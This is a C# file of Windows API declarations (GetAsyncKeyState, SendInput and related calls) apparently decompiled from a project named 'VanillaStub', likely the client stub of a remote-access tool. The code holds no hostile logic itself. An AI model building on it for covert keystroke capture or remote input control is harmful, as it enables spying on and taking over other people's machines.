using System;
using System.Runtime.InteropServices;
using VanillaStub.Helpers.Services.InputSimulator.Native;

internal static class Class10
{
	[DllImport("user32.dll", SetLastError = true)]
	public static extern short GetAsyncKeyState(ushort ushort_0);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern short GetKeyState(ushort ushort_0);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern uint SendInput(uint uint_0, INPUT[] input_0, int int_0);

	[DllImport("user32.dll")]
	public static extern IntPtr GetMessageExtraInfo();
}
